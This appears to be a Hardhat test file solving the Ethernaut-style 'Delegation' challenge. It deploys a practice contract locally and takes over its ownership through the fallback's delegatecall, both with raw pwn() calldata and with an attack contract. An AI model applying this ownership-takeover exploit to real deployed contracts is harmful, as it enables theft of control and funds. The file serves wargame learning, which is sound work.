const {expect} = require("chai");
const {loadFixture} = require("ethereum-waffle");
const {ethers} = require("hardhat");
const {getContractAt} = require("@nomiclabs/hardhat-ethers/internal/helpers");
const hre = require("hardhat");

describe("BreakEven", function () {
    let deployer, user1, user2;

    it("Attack Using EOA", async function () {
        [deployer, user1, user2] = await ethers.getSigners();

        let BaseDelegate = await ethers.getContractFactory("Delegate");
        let delegateContract = await BaseDelegate.connect(deployer).deploy(deployer.address);
        await delegateContract.deployed();

        const BaseDelegation = await ethers.getContractFactory("Delegation");
        let delegationContract = await BaseDelegation.connect(deployer).deploy(delegateContract.address);
        await delegationContract.deployed()

        const baseAttackContract = await ethers.getContractFactory("AttackDelegation");
        let attackContract = await baseAttackContract.connect(user2).deploy(delegationContract.address);
        await attackContract.deployed()


        const tx = await user2.sendTransaction({
            to: delegationContract.address,
            data: 0xdd365b8b
        });
       await tx.wait();

        expect(
            await delegationContract.owner()
        ).to.be.equal(user2.address);


    });

    it("Attack using contract", async function () {
        [deployer, user1, user2] = await ethers.getSigners();

        let BaseDelegate = await ethers.getContractFactory("Delegate");
        let delegateContract = await BaseDelegate.connect(deployer).deploy(deployer.address);
        await delegateContract.deployed();

        const BaseDelegation = await ethers.getContractFactory("Delegation");
        let delegationContract = await BaseDelegation.connect(deployer).deploy(delegateContract.address);
        await delegationContract.deployed()

        const baseAttackContract = await ethers.getContractFactory("AttackDelegation");
        let attackContract = await baseAttackContract.connect(user2).deploy(delegationContract.address);
        await attackContract.deployed()



        const tnx = await attackContract.connect(user2).attack()
        await tnx.wait()

        expect(
            await delegationContract.owner()
        ).to.be.equal(attackContract.address);

    });

    async function deployFixture() {
        let BaseDelegate = await ethers.getContractFactory("Delegate");
        let delegateContract = await BaseDelegate.connect(deployer).deploy(deployer.address);
        await delegateContract.deployed();

        const BaseDelegation = await ethers.getContractFactory("Delegation");
        let delegationContract = await BaseDelegation.connect(deployer).deploy(delegateContract.address);
        await delegationContract.deployed()

        return [delegationContract, BaseDelegate]
    }
});
